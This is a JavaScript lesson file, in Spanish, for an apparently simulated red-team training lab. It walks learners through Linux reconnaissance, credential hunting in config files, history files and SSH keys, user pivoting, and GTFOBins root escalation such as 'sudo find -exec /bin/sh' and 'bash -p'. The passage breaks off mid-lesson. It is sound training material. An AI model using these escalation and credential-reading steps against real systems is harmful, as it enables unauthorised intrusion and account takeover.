/* Misiones del laboratorio de Red Team. Cada paso: t (qué hacer), hint (una solución), ok (comprueba).
   ok recibe { line, sh, fs, r }. setup(sh, fs) monta la máquina con RT.buildBox.
   Todo es simulado: las técnicas no funcionan fuera de esta página. */
(function (G) {
  'use strict';

  const RT = G.REDTEAM;
  const strip = (s) => s.replace(/\x01.|\x02/g, '');
  const box = (spec) => (sh, fs) => RT.buildBox(sh, fs, Object.assign({ foothold: 'www-data' }, spec));
  const root = (c) => c.sh.user === 'root';
  const as = (c, u) => c.sh.user === u;
  const okOut = (c, re) => re.test(strip(c.r.out)) && !c.r.err;
  const ran = (re) => (c) => re.test(c.line);
  const reads = (c, p, re) => {
    const n = c.fs.find(p);
    return !!n && new RegExp(re || '.').test(n.content);
  };

  G.LESSONS = [
    /* ================= NIVEL 1 · EL PUNTO DE APOYO ================= */
    {
      id: 'orientacion',
      title: 'Acabas de entrar',
      tag: 'Orientación',
      say: 'Soy Pix, tu copiloto. Acabas de conseguir una shell en un servidor. Lo primero: ¿dónde estás y quién eres?',
      setup: box({ files: [{ path: '/var/www/index.php', content: '<?php echo "web";\n', owner: 'www-data' }] }),
      body: `
        <p>Has entrado en un servidor ajeno (con permiso: es un laboratorio) a través de una <b>shell</b> — una terminal
        remota. No sabes nada de esta máquina. El reconocimiento inicial es siempre el mismo puñado de preguntas.</p>
        <div class="cards">
          <div><code>whoami</code><small>¿qué usuario soy?</small></div>
          <div><code>id</code><small>¿en qué grupos estoy?</small></div>
          <div><code>hostname</code><small>¿qué máquina es?</small></div>
          <div><code>pwd</code><small>¿dónde estoy?</small></div>
          <div><code>uname -a</code><small>¿qué núcleo corre?</small></div>
        </div>
        <p>Fíjate en el <i>prompt</i> de la derecha: pone <code>www-data@la-fragua</code>. Has entrado como
        <b>www-data</b>, el usuario del servidor web: casi sin privilegios. Tu objetivo será llegar a <b>root</b>.</p>`,
      steps: [
        { t: 'Pregunta con qué usuario estás: <code>whoami</code>', hint: 'whoami', ok: (c) => okOut(c, /^www-data$/m) },
        { t: 'Mira tus grupos con <code>id</code>. Los grupos importan mucho (sudo, docker…).', hint: 'id', ok: (c) => okOut(c, /uid=33/) },
        { t: '¿En qué máquina estás? <code>hostname</code>', hint: 'hostname', ok: (c) => okOut(c, /fragua/) },
        { t: '¿En qué carpeta? <code>pwd</code>', hint: 'pwd', ok: (c) => okOut(c, /\/var\/www/) },
        { t: '¿Qué sistema es? <code>cat /etc/os-release</code>', hint: 'cat /etc/os-release', ok: (c) => okOut(c, /Ubuntu/) },
        { t: 'Y el núcleo, por si hay exploits conocidos: <code>uname -a</code>', hint: 'uname -a', ok: (c) => okOut(c, /Linux/) },
      ],
    },
    {
      id: 'estabilizar',
      title: 'Estabiliza la shell',
      tag: 'TTY',
      say: 'Una shell de exploit suele ser "tonta": sin flechas, sin autocompletado, y se cae si pulsas Ctrl+C. Vamos a arreglarla.',
      setup: (sh, fs) => {
        box({})(sh, fs);
        sh.installed.add('python3');
      },
      body: `
        <p>La shell que consigues con un exploit no es una terminal de verdad (no tiene <b>TTY</b>): no recuerda el
        historial, no autocompleta y un <kbd>Ctrl</kbd>+<kbd>C</kbd> te echa. Antes de nada, se <b>estabiliza</b>.</p>
        <div class="flow pipe">
          <span class="box">python3 pty</span><span class="arrow">→</span>
          <span class="box">export TERM</span><span class="arrow">→</span>
          <span class="box">shell completa</span>
          <small>el truco clásico cuando hay python en la máquina</small>
        </div>
        <p>El conjuro más usado invoca a python para que lance una bash «de verdad»:</p>
        <p><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
        <p class="warn">En este simulador la terminal ya es cómoda, así que el efecto no se nota; pero el paso es real y
        es lo primero que hace cualquiera tras entrar.</p>`,
      steps: [
        { t: '¿Hay python en la máquina? <code>which python3</code>', hint: 'which python3', ok: (c) => okOut(c, /python3/) },
        { t: 'Lanza la shell estable: <code>python3 -c \'import pty; pty.spawn("/bin/bash")\'</code>', hint: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'', ok: (c) => /pty\.spawn/.test(c.line) && !c.r.err },
        { t: 'Dile a la terminal qué tipo es, para que pinte bien: <code>export TERM=xterm</code>', hint: 'export TERM=xterm', ok: (c) => c.sh.env.TERM === 'xterm' },
        { t: 'Comprueba que sigues siendo tú: <code>id</code>', hint: 'id', ok: (c) => okOut(c, /www-data/) },
      ],
    },
    {
      id: 'reconocer',
      title: 'Reconoce el terreno',
      tag: 'Enumeración básica',
      say: 'Antes de atacar, mira el mapa: quién más vive aquí, qué corre y por dónde se conecta.',
      setup: box({
        users: [{ name: 'laura', uid: 1000 }, { name: 'backup', uid: 998, shell: '/usr/sbin/nologin' }],
        procs: [{ user: 'mysql', pid: 1120, cmd: '/usr/sbin/mysqld' }],
      }),
      body: `
        <p>Un servidor no tiene un solo usuario. Y cada servicio que corre y cada puerto abierto es una pista o un
        posible camino. Esta es la foto que se saca cualquiera nada más entrar.</p>
        <div class="cards">
          <div><code>cat /etc/passwd</code><small>todos los usuarios</small></div>
          <div><code>ls -la /home</code><small>las carpetas de la gente</small></div>
          <div><code>ps aux</code><small>qué se está ejecutando y quién lo lanza</small></div>
          <div><code>ss -tulnp</code><small>puertos abiertos</small></div>
        </div>
        <p>En <code>/etc/passwd</code>, los usuarios con <code>/bin/bash</code> al final son personas; los que tienen
        <code>nologin</code> son cuentas de servicios. Un proceso que corre como un usuario distinto es un buen objetivo
        para pivotar hacia él.</p>`,
      steps: [
        { t: '¿Quién más vive aquí? <code>cat /etc/passwd</code>', hint: 'cat /etc/passwd', ok: (c) => okOut(c, /laura/) },
        { t: 'Quédate solo con quien tiene shell de verdad: <code>grep bash /etc/passwd</code>', hint: 'grep bash /etc/passwd', ok: (c) => okOut(c, /laura/) && !/nologin/.test(strip(c.r.out)) },
        { t: 'Mira las carpetas de los usuarios: <code>ls -la /home</code>', hint: 'ls -la /home', ok: (c) => /^ls\b/.test(c.line) && /laura/.test(c.r.out) },
        { t: '¿Qué procesos corren y quién los lanza? <code>ps aux</code>', hint: 'ps aux', ok: (c) => /^ps\b/.test(c.line) && /mysqld/.test(c.r.out) },
        { t: '¿Qué puertos están abiertos? <code>ss -tulnp</code>', hint: 'ss -tulnp', ok: (c) => /^ss\b/.test(c.line) && /LISTEN/.test(c.r.out) },
      ],
    },
    {
      id: 'botin',
      title: 'El primer botín',
      tag: 'user.txt · credenciales',
      say: 'En un CTF, entrar te da la bandera de usuario. Y por el camino casi siempre hay credenciales olvidadas.',
      setup: box({
        files: [
          { path: '/var/www/user.txt', content: 'b1t3_m3_2024\n', owner: 'www-data' },
          { path: '/var/www/html/wp-config.php', content: "<?php\ndefine('DB_USER','wpuser');\ndefine('DB_PASSWORD','Sup3rP4ss!');\n", owner: 'www-data' },
          { path: '/var/www/html/.env', content: 'APP_ENV=prod\nMAIL_PASS=correo123\n', owner: 'www-data' },
        ],
      }),
      body: `
        <p>La primera recompensa, el equivalente al <code>user.txt</code> de un CTF, suele estar en la carpeta donde
        aterrizas. Y las aplicaciones web guardan sus contraseñas en archivos de configuración (<code>wp-config.php</code>,
        <code>.env</code>, <code>config.php</code>) que tú, como <code>www-data</code>, <b>sí puedes leer</b>.</p>
        <p>Esas contraseñas son el billete para el siguiente paso: la gente las <b>reutiliza</b>, así que la clave de la
        base de datos puede ser también la de un usuario del sistema.</p>
        <div class="flow pipe">
          <span class="box">grep -r password</span><span class="arrow">→</span>
          <span class="box">credencial</span><span class="arrow">→</span>
          <span class="box">pivotar</span>
          <small>buscar, encontrar, reutilizar</small>
        </div>`,
      steps: [
        { t: 'Lee tu bandera de usuario: <code>cat /var/www/user.txt</code>', hint: 'cat /var/www/user.txt', ok: (c) => okOut(c, /b1t3/) },
        { t: 'Busca archivos de configuración de la web: <code>ls -la /var/www/html</code>', hint: 'ls -la /var/www/html', ok: (c) => /^ls\b/.test(c.line) && /wp-config/.test(c.r.out) },
        { t: 'Rebusca contraseñas en todo /var/www: <code>grep -ri password /var/www</code>', hint: 'grep -ri password /var/www', ok: (c) => /grep\b/.test(c.line) && /Sup3rP4ss/.test(c.r.out) },
        { t: 'Lee el archivo de entorno oculto: <code>cat /var/www/html/.env</code>', hint: 'cat /var/www/html/.env', ok: (c) => okOut(c, /MAIL_PASS/) },
        { t: 'Apunta mentalmente esa clave <code>Sup3rP4ss!</code>: la usaremos para pivotar. Confírmala con grep: <code>grep -r Sup3rP4ss /var/www</code>', hint: 'grep -r Sup3rP4ss /var/www', ok: (c) => okOut(c, /Sup3rP4ss/) },
      ],
    },

    /* ================= NIVEL 2 · ENUMERACIÓN ================= */
    {
      id: 'sudo-l',
      level: 2,
      title: 'Lo primero: sudo -l',
      tag: 'sudo -l',
      say: 'Nivel 2: encontrar el camino a root. La primera orden que escribe TODO el mundo: sudo -l.',
      setup: box({ sudoers: { 'www-data': [{ bin: '/usr/bin/vim', runas: 'root', nopasswd: true }] } }),
      body: `
        <p>Antes de nada: <code>sudo -l</code> enseña qué puedes ejecutar con <code>sudo</code> en esta máquina, y
        muchas veces con <code>NOPASSWD</code> (sin que te pida contraseña). Un solo programa mal puesto ahí puede ser
        el camino directo a root.</p>
        <div class="anatomy">
          <span class="part a"><code>(root)</code><small>lo ejecutas como…</small></span>
          <span class="part b"><code>NOPASSWD:</code><small>sin contraseña</small></span>
          <span class="part c"><code>/usr/bin/vim</code><small>…este programa</small></span>
        </div>
        <p>Que puedas ejecutar <code>vim</code>, <code>find</code>, <code>awk</code> o <code>less</code> como root no
        parece gran cosa… hasta que descubres que todos ellos pueden <b>abrir otra shell</b>. Eso lo veremos en el
        nivel 4; aquí solo aprendemos a <b>detectar</b> el agujero.</p>`,
      steps: [
        { t: 'Lánzalo: <code>sudo -l</code>', hint: 'sudo -l', ok: (c) => okOut(c, /may run/) },
        { t: 'Fíjate en la línea que empieza por <code>(root) NOPASSWD:</code>. ¿Qué programa aparece? Vuelve a mirarlo.', hint: 'sudo -l', ok: (c) => okOut(c, /vim/) },
        { t: 'Comprueba que, tal cual, no puedes leer la bandera de root: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => /Permiso denegado|No existe/.test(c.r.err) },
      ],
    },
    {
      id: 'suid',
      level: 2,
      title: 'Binarios SUID',
      tag: 'find -perm -4000',
      say: 'Un binario SUID se ejecuta con los permisos de su DUEÑO, no con los tuyos. Si el dueño es root…',
      setup: box({ suid: ['/usr/bin/find', '/usr/bin/bash', '/opt/tools/backup'] }),
      body: `
        <p>Un archivo con el bit <b>SUID</b> se ejecuta siempre con los privilegios de su <b>dueño</b>. Si un binario es
        propiedad de root y tiene SUID, cualquiera que lo ejecute actúa, por un momento, como root. En <code>ls -l</code>
        se ve una <b>s</b> donde debería ir la x:</p>
        <div class="anatomy perms">
          <span class="part a"><code>-rws</code><small>SUID (dueño)</small></span>
          <span class="part b"><code>r-x</code><small>grupo</small></span>
          <span class="part c"><code>r-x</code><small>otros</small></span>
        </div>
        <p>Algunos binarios tienen SUID a propósito (<code>passwd</code>, <code>sudo</code>). El problema es cuando hay
        uno que <b>no debería</b>: <code>find</code>, <code>bash</code>, <code>nmap</code>, o uno raro en <code>/opt</code>.</p>`,
      steps: [
        { t: 'Busca todos los binarios SUID del sistema: <code>find / -perm -4000 -type f 2>/dev/null</code>', hint: 'find / -perm -4000 -type f 2>/dev/null', ok: (c) => /\/find$/m.test(strip(c.r.out)) && /\/backup$/m.test(strip(c.r.out)) },
        { t: 'Hay uno rarísimo en /opt. Míralo de cerca: <code>ls -l /opt/tools/backup</code>. ¿Ves la <code>s</code>?', hint: 'ls -l /opt/tools/backup', ok: (c) => /^ls\b/.test(c.line) && /rws/.test(c.r.out) },
        { t: 'Compara con uno normal: <code>ls -l /usr/bin/id</code> (ese lleva una x corriente).', hint: 'ls -l /usr/bin/id', ok: (c) => /^ls\b/.test(c.line) && /-rwx/.test(c.r.out) },
      ],
    },
    {
      id: 'cron',
      level: 2,
      title: 'Tareas programadas',
      tag: 'cron',
      say: 'root tiene scripts que se ejecutan solos cada pocos minutos. Si puedes tocar uno de esos scripts…',
      setup: box({
        cron: { script: '/opt/scripts/limpieza.sh', owner: 'root' },
        files: [
          { path: '/etc/crontab', content: '# m h dom mon dow user\tcommand\n*/5 * * * * root /opt/scripts/limpieza.sh\n', owner: 'root' },
          { path: '/opt/scripts/limpieza.sh', content: '#!/bin/bash\nfind /tmp -type f -mtime +7 -delete\n', owner: 'root', mode: 0o777 },
        ],
      }),
      body: `
        <p><code>cron</code> ejecuta tareas a intervalos. Lo interesante para nosotros: muchas las lanza <b>root</b>, y a
        veces el script que ejecutan tiene permisos demasiado abiertos y <b>tú puedes modificarlo</b>. Si editas un
        script que root va a ejecutar, tu código correrá como root.</p>
        <div class="flow pipe">
          <span class="box">cat /etc/crontab</span><span class="arrow">→</span>
          <span class="box">¿qué script?</span><span class="arrow">→</span>
          <span class="box">ls -l del script</span>
          <small>¿lo ejecuta root? ¿puedo escribir en él?</small>
        </div>
        <p>Aquí solo lo <b>detectamos</b>: la explotación es del nivel 4. La señal de alarma: un script de cron de root
        con permisos <code>rwx</code> para todos (termina en <code>rwxrwxrwx</code>).</p>`,
      steps: [
        { t: 'Lee las tareas del sistema: <code>cat /etc/crontab</code>', hint: 'cat /etc/crontab', ok: (c) => okOut(c, /limpieza\.sh/) },
        { t: 'La tarea la lanza <code>root</code> y corre un script. Mira sus permisos: <code>ls -l /opt/scripts/limpieza.sh</code>', hint: 'ls -l /opt/scripts/limpieza.sh', ok: (c) => /^ls\b/.test(c.line) && /rwxrwxrwx/.test(c.r.out) },
        { t: 'Confírmalo: ¿puedes escribir en él? <code>find /opt/scripts -writable</code>', hint: 'find /opt/scripts -writable', ok: (c) => /writable/.test(c.line) && /limpieza/.test(c.r.out) },
        { t: 'Lee el script para saber qué hace: <code>cat /opt/scripts/limpieza.sh</code>', hint: 'cat /opt/scripts/limpieza.sh', ok: (c) => okOut(c, /bin\/bash/) },
      ],
    },
    {
      id: 'capabilities',
      level: 2,
      title: 'Capabilities y archivos escribibles',
      tag: 'getcap · -writable',
      say: 'Las capabilities son «trocitos» de root pegados a un binario. Y los archivos escribibles donde no toca, otro regalo.',
      setup: box({
        caps: { '/usr/bin/python3': 'cap_setuid+ep', '/usr/bin/ping': 'cap_net_raw+ep' },
        files: [{ path: '/etc/passwd', content: '', owner: 'root', mode: 0o666 }],
      }),
      body: `
        <p>Las <b>capabilities</b> reparten los poderes de root en trozos y se los pegan a un binario concreto. La
        peligrosa es <code>cap_setuid</code>: permite al programa cambiarse a sí mismo a UID 0. Se listan con
        <code>getcap</code>.</p>
        <div class="cards">
          <div><code>cap_setuid</code><small>convertirse en root: ¡peligro!</small></div>
          <div><code>cap_net_raw</code><small>tráfico de red: normal en ping</small></div>
          <div><code>cap_dac_read_search</code><small>leer cualquier archivo</small></div>
        </div>
        <p>Y un clásico: buscar <b>archivos escribibles</b> en rutas del sistema. Si <code>/etc/passwd</code> o
        <code>/etc/shadow</code> fueran escribibles por ti, sería game over. <code>find / -writable</code> los saca.</p>`,
      steps: [
        { t: 'Busca binarios con capabilities: <code>getcap -r / 2>/dev/null</code>', hint: 'getcap -r / 2>/dev/null', ok: (c) => /cap_setuid/.test(c.r.out) },
        { t: 'Uno tiene <code>cap_setuid</code>: el peligroso. ¿Cuál es? Vuelve a mirar la lista.', hint: 'getcap -r / 2>/dev/null', ok: (c) => /python3 cap_setuid/.test(c.r.out) },
        { t: 'Busca archivos de sistema escribibles: <code>find /etc -writable -type f 2>/dev/null</code>', hint: 'find /etc -writable -type f 2>/dev/null', ok: (c) => /passwd/.test(c.r.out) },
        { t: '¡/etc/passwd escribible! Confírmalo con <code>ls -l /etc/passwd</code> (verás <code>rw-rw-rw-</code>).', hint: 'ls -l /etc/passwd', ok: (c) => /^ls\b/.test(c.line) && /rw-rw-rw-/.test(c.r.out) },
      ],
    },
    {
      id: 'credenciales',
      level: 2,
      title: 'Credenciales por todas partes',
      tag: 'Misión final',
      say: 'Última de enumeración. Las contraseñas están donde la gente las deja: configs, historiales y claves SSH.',
      setup: box({
        users: [{ name: 'jorge', uid: 1000, homeMode: 0o755 }],
        files: [
          { path: '/var/backups/db.sql', content: '-- dump\nINSERT INTO users VALUES(1,"jorge","Ab3j0rr0.99");\n', owner: 'root', mode: 0o644 },
          { path: '/home/jorge/.bash_history', content: 'ls\nmysql -u root -pRootM4ster\ncd /tmp\nsudo -l\n', owner: 'jorge', mode: 0o644 },
          { path: '/home/jorge/.ssh/id_rsa', content: '-----BEGIN OPENSSH PRIVATE KEY-----\nmiclaveprivada\n-----END OPENSSH PRIVATE KEY-----\n', owner: 'jorge', mode: 0o644 },
        ],
      }),
      body: `
        <p>Reúnes aquí todo lo del nivel. Las credenciales se esconden en sitios muy concretos, y revisarlos todos es la
        rutina del pentester:</p>
        <div class="cards">
          <div><code>config.php · .env</code><small>claves de apps</small></div>
          <div><code>.bash_history</code><small>comandos tecleados (¡con contraseñas!)</small></div>
          <div><code>.ssh/id_rsa</code><small>claves privadas para entrar sin contraseña</small></div>
          <div><code>/var/backups</code><small>copias con datos sensibles</small></div>
        </div>
        <p class="warn">Una clave privada SSH (<code>id_rsa</code>) con permisos de lectura para todos es un fallo grave:
        es una llave que abre la cuenta de su dueño.</p>`,
      steps: [
        { t: 'Un historial de comandos puede delatar una contraseña: <code>cat /home/jorge/.bash_history</code>', hint: 'cat /home/jorge/.bash_history', ok: (c) => okOut(c, /RootM4ster/) },
        { t: 'Busca contraseñas en las copias de seguridad: <code>grep -ri pass /var/backups</code> (o lee el .sql).', hint: 'cat /var/backups/db.sql', ok: (c) => okOut(c, /Ab3j0rr0/) },
        { t: '¿Hay claves SSH legibles? <code>find /home -name id_rsa 2>/dev/null</code>', hint: 'find /home -name id_rsa 2>/dev/null', ok: (c) => /id_rsa/.test(c.r.out) },
        { t: 'Mira sus permisos: <code>ls -l /home/jorge/.ssh/id_rsa</code>. Que la puedas leer tú es el fallo.', hint: 'ls -l /home/jorge/.ssh/id_rsa', ok: (c) => /^ls\b/.test(c.line) && /id_rsa/.test(c.r.out) },
        { t: 'Lee la clave privada: <code>cat /home/jorge/.ssh/id_rsa</code>', hint: 'cat /home/jorge/.ssh/id_rsa', ok: (c) => okOut(c, /PRIVATE KEY/) },
      ],
    },

    /* ================= NIVEL 3 · PIVOTING DE USUARIO ================= */
    {
      id: 'pivot-pass',
      level: 3,
      title: 'Contraseña reutilizada',
      tag: 'su',
      say: 'Nivel 3: dejar de ser www-data. El camino más común: una contraseña que alguien reutilizó.',
      setup: box({
        users: [{ name: 'david', uid: 1000, pass: 'Manzana_2024' }],
        files: [
          { path: '/var/www/html/config.php', content: "<?php\n$db_user = 'david';\n$db_pass = 'Manzana_2024';\n", owner: 'www-data' },
          { path: '/home/david/user.txt', content: 'd4v1d_fl4g\n', owner: 'david', mode: 0o640 },
        ],
      }),
      body: `
        <p><b>Pivotar</b> es saltar de un usuario a otro. Rara vez se pasa de <code>www-data</code> a root de golpe:
        primero se salta a un usuario normal. La forma más habitual es una contraseña encontrada en un config que
        resulta ser <b>la misma</b> que usa esa persona para su cuenta del sistema.</p>
        <div class="flow pipe">
          <span class="box">grep en config</span><span class="arrow">→</span>
          <span class="box">su david</span><span class="arrow">→</span>
          <span class="box">eres david</span>
          <small>su cambia de usuario; te pedirá su contraseña</small>
        </div>
        <p><code>su david</code> pide la contraseña de david. Si la que encontraste en el config vale, pasas a ser él,
        con su carpeta y sus permisos.</p>`,
      steps: [
        { t: 'Encuentra la contraseña en el config: <code>grep -i pass /var/www/html/config.php</code>', hint: 'grep -i pass /var/www/html/config.php', ok: (c) => okOut(c, /Manzana_2024/) },
        { t: 'Ahora tú no puedes leer la carpeta de david: <code>cat /home/david/user.txt</code> fallará.', hint: 'cat /home/david/user.txt', ok: (c) => /Permiso denegado/.test(c.r.err) },
        { t: 'Pivota con <code>su david</code>. Cuando pida la contraseña, escribe <code>Manzana_2024</code>.', hint: 'su david', pass: 'Manzana_2024', ok: (c) => as(c, 'david') },
        { t: 'Ya eres david. Compruébalo: <code>whoami</code>', hint: 'whoami', ok: (c) => okOut(c, /david/) },
        { t: 'Y lee su bandera: <code>cat /home/david/user.txt</code>', hint: 'cat /home/david/user.txt', ok: (c) => okOut(c, /d4v1d/) },
      ],
    },
    {
      id: 'pivot-ssh',
      level: 3,
      title: 'La llave privada',
      tag: 'ssh',
      say: 'Una clave SSH privada es una llave. Si encuentras la de alguien, entras a su cuenta sin saber su contraseña.',
      setup: (sh, fs) => {
        box({
          foothold: 'david',
          users: [{ name: 'david', uid: 1000 }, { name: 'elena', uid: 1001 }],
          files: [
            { path: '/home/david/.ssh/id_rsa', content: '-----BEGIN OPENSSH PRIVATE KEY-----\nclave-de-elena\n-----END OPENSSH PRIVATE KEY-----\n', owner: 'david', mode: 0o600 },
            { path: '/home/elena/user.txt', content: '3l3n4_fl4g\n', owner: 'elena', mode: 0o640 },
          ],
        })(sh, fs);
        sh.rt.sshKeys = { 'david:id_rsa': 'elena' };
      },
      body: `
        <p>Ahora eres <b>david</b> (hemos pivotado). En su carpeta <code>.ssh</code> hay una clave privada. Una clave
        privada <code>id_rsa</code> es la mitad de una cerradura: quien la tiene puede entrar a la cuenta donde esté
        instalada la mitad pública, <b>sin contraseña</b>.</p>
        <div class="anatomy">
          <span class="part a"><code>id_rsa</code><small>privada: la llave</small></span>
          <span class="sep">→</span>
          <span class="part d"><code>ssh elena@localhost</code><small>abre su cuenta</small></span>
        </div>
        <p>En un caso real copiarías la clave a tu máquina y harías <code>ssh -i id_rsa elena@víctima</code>. Aquí, como
        ya estás dentro, basta <code>ssh elena@localhost</code>: la máquina reconoce la clave de david como válida para
        elena (un descuido de configuración).</p>`,
      steps: [
        { t: 'Mira la clave privada que tiene david: <code>ls -la /home/david/.ssh</code>', hint: 'ls -la /home/david/.ssh', ok: (c) => /^ls\b/.test(c.line) && /id_rsa/.test(c.r.out) },
        { t: 'Léela (es la llave): <code>cat /home/david/.ssh/id_rsa</code>', hint: 'cat /home/david/.ssh/id_rsa', ok: (c) => okOut(c, /PRIVATE KEY/) },
        { t: 'Entra en la cuenta de elena con ella: <code>ssh elena@localhost</code>', hint: 'ssh elena@localhost', ok: (c) => as(c, 'elena') },
        { t: 'Ya eres elena: <code>whoami</code>', hint: 'whoami', ok: (c) => okOut(c, /elena/) },
        { t: 'Lee su bandera: <code>cat /home/elena/user.txt</code>', hint: 'cat /home/elena/user.txt', ok: (c) => okOut(c, /3l3n4/) },
      ],
    },
    {
      id: 'pivot-sudou',
      level: 3,
      title: 'Correr como otro',
      tag: 'sudo -u',
      say: 'A veces no necesitas su contraseña: sudo te deja ejecutar algo DIRECTAMENTE como otro usuario.',
      setup: (sh, fs) => {
        box({
          foothold: 'elena',
          users: [{ name: 'elena', uid: 1001 }, { name: 'gestor', uid: 1002 }],
          sudoers: { elena: [{ bin: '/usr/bin/cat', runas: 'gestor', nopasswd: true }] },
          files: [{ path: '/home/gestor/user.txt', content: 'g3st0r_fl4g\n', owner: 'gestor', mode: 0o600 }],
        })(sh, fs);
      },
      body: `
        <p>Eres <b>elena</b>. En su <code>sudo -l</code> no aparece root… pero sí la posibilidad de ejecutar una orden
        <b>como otro usuario</b>, con la opción <code>-u</code>. Es pivoting lateral sin necesidad de contraseña.</p>
        <div class="anatomy">
          <span class="part a"><code>sudo -u gestor</code><small>hazte pasar por gestor…</small></span>
          <span class="part c"><code>cat archivo</code><small>…para ejecutar esto</small></span>
        </div>
        <p>Si elena puede ejecutar <code>cat</code> como <code>gestor</code>, puede leer cualquier archivo de gestor,
        aunque su cuenta de elena no tenga permiso. Perfecto para leer un archivo privado del siguiente usuario.</p>`,
      steps: [
        { t: 'Mira qué te deja sudo: <code>sudo -l</code>', hint: 'sudo -l', ok: (c) => okOut(c, /gestor/) },
        { t: 'Como elena no puedes leer la carpeta de gestor: <code>cat /home/gestor/user.txt</code> falla.', hint: 'cat /home/gestor/user.txt', ok: (c) => /Permiso denegado/.test(c.r.err) },
        { t: 'Pero sí puedes leerla haciéndote pasar por gestor: <code>sudo -u gestor cat /home/gestor/user.txt</code>', hint: 'sudo -u gestor cat /home/gestor/user.txt', ok: (c) => okOut(c, /g3st0r/) },
      ],
    },
    {
      id: 'pivot-cadena',
      level: 3,
      title: 'La cadena de pivoting',
      tag: 'Misión final',
      say: 'Todo junto: de www-data, saltando de usuario en usuario hasta el que de verdad importa.',
      setup: (sh, fs) => {
        box({
          users: [
            { name: 'web', uid: 1000, pass: 'W3bApp#1' },
            { name: 'ci', uid: 1001 },
            { name: 'sysadmin', uid: 1002 },
          ],
          sudoers: { ci: [{ bin: '/usr/bin/cat', runas: 'sysadmin', nopasswd: true }] },
          files: [
            { path: '/var/www/html/.env', content: 'DB_USER=web\nDB_PASS=W3bApp#1\n', owner: 'www-data' },
            { path: '/home/web/.ssh/id_rsa', content: '-----BEGIN OPENSSH PRIVATE KEY-----\nclave-ci\n-----END OPENSSH PRIVATE KEY-----\n', owner: 'web', mode: 0o600 },
            { path: '/home/web/nota.txt', content: 'La clave de aquí sirve para entrar como ci.\n', owner: 'web', mode: 0o640 },
            { path: '/home/sysadmin/flag.txt', content: 'c4d3n4_c0mpl3t4\n', owner: 'sysadmin', mode: 0o600 },
          ],
        })(sh, fs);
        sh.rt.sshKeys = { 'web:id_rsa': 'ci' };
      },
      body: `
        <p>El pivoting real es una <b>cadena</b>: www-data → web → ci → sysadmin. Cada salto usa una técnica distinta de
        las que has aprendido, y cada usuario te acerca al objetivo.</p>
        <div class="flow pipe">
          <span class="box">www-data</span><span class="arrow">→</span>
          <span class="box">web</span><span class="arrow">→</span>
          <span class="box">ci</span><span class="arrow">→</span>
          <span class="box">sysadmin</span>
          <small>contraseña · clave SSH · sudo -u</small>
        </div>
        <p>Sin pistas en el texto esta vez: enumera, encuentra y salta. La bandera está en la carpeta de sysadmin.</p>`,
      steps: [
        { t: 'Saca la contraseña de web del .env: <code>cat /var/www/html/.env</code>', hint: 'cat /var/www/html/.env', ok: (c) => okOut(c, /W3bApp/) },
        { t: 'Pivota a web (contraseña <code>W3bApp#1</code>): <code>su web</code>', hint: 'su web', pass: 'W3bApp#1', ok: (c) => as(c, 'web') },
        { t: 'web tiene una clave SSH. Úsala para entrar como ci: <code>ssh ci@localhost</code>', hint: 'ssh ci@localhost', ok: (c) => as(c, 'ci') },
        { t: 'ci puede ejecutar cat como sysadmin. Míralo: <code>sudo -l</code>', hint: 'sudo -l', ok: (c) => okOut(c, /sysadmin/) },
        { t: 'Lee la bandera final haciéndote pasar por sysadmin: <code>sudo -u sysadmin cat /home/sysadmin/flag.txt</code>', hint: 'sudo -u sysadmin cat /home/sysadmin/flag.txt', ok: (c) => okOut(c, /c4d3n4/) },
      ],
    },

    /* ================= NIVEL 4 · ESCALADA A ROOT ================= */
    {
      id: 'esc-sudo',
      level: 4,
      title: 'sudo mal configurado',
      tag: 'GTFOBins',
      say: 'Nivel 4: ser root. Empezamos por el regalo más común: un sudo que te deja un programa que abre shells.',
      setup: box({ sudoers: { 'www-data': [{ bin: '/usr/bin/find', runas: 'root', nopasswd: true }] }, files: [{ path: '/root/root.txt', content: 'r00t3d_c0n_sud0\n', owner: 'root', mode: 0o600 }] }),
      body: `
        <p>Recuerda el nivel 2: si <code>sudo -l</code> te permite ejecutar <code>find</code>, <code>vim</code>,
        <code>awk</code>… como root, tienes el camino. Esos programas pueden <b>lanzar otra shell</b>, y si los ejecutas
        con sudo, esa shell será de root.</p>
        <p>La web <b>GTFOBins</b> lista, para cada programa, el truco exacto. Para <code>find</code>:</p>
        <p><code>sudo find . -exec /bin/sh \\; -quit</code></p>
        <p>La opción <code>-exec</code> de find ejecuta una orden por cada archivo; le decimos que ejecute
        <code>/bin/sh</code>. Como find corre como root (por el sudo), la shell que abre también.</p>
        <div class="cards">
          <div><code>find</code><small>-exec /bin/sh \\;</small></div>
          <div><code>vim</code><small>-c ':!/bin/sh'</small></div>
          <div><code>awk</code><small>'BEGIN{system("/bin/sh")}'</small></div>
          <div><code>less</code><small>!/bin/sh (dentro)</small></div>
        </div>`,
      steps: [
        { t: 'Confirma el camino: <code>sudo -l</code>', hint: 'sudo -l', ok: (c) => okOut(c, /find/) },
        { t: 'Escala a root con el truco de GTFOBins: <code>sudo find . -exec /bin/sh \\; -quit</code>', hint: 'sudo find . -exec /bin/sh \\; -quit', ok: root },
        { t: 'Compruébalo: <code>id</code> debe decir <code>uid=0(root)</code>.', hint: 'id', ok: (c) => root(c) && okOut(c, /uid=0/) },
        { t: 'Recoge la bandera de root: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /r00t3d/) },
      ],
    },
    {
      id: 'esc-suid',
      level: 4,
      title: 'Un binario SUID',
      tag: 'SUID',
      say: 'Sin sudo esta vez: un binario SUID de root que abre una shell y mantiene sus privilegios.',
      setup: box({ suid: ['/usr/bin/bash', '/usr/bin/find'], files: [{ path: '/root/root.txt', content: 'suid_r00t\n', owner: 'root', mode: 0o600 }] }),
      body: `
        <p>En el nivel 2 encontraste binarios SUID. Ahora los explotas. La clave es que, al ejecutar un binario SUID de
        root, actúas como root <b>mientras dura</b>. El truco es abrir una shell que <b>conserve</b> ese privilegio.</p>
        <p>Con un <code>bash</code> SUID, la opción <code>-p</code> (de <i>privileged</i>) evita que bash «suelte» los
        privilegios de root al arrancar:</p>
        <p><code>/usr/bin/bash -p</code></p>
        <p>Con <code>find</code> SUID, el mismo <code>-exec</code> de antes, pero añadiendo <code>-p</code> a la shell:</p>
        <p><code>find . -exec /bin/sh -p \\; -quit</code></p>`,
      steps: [
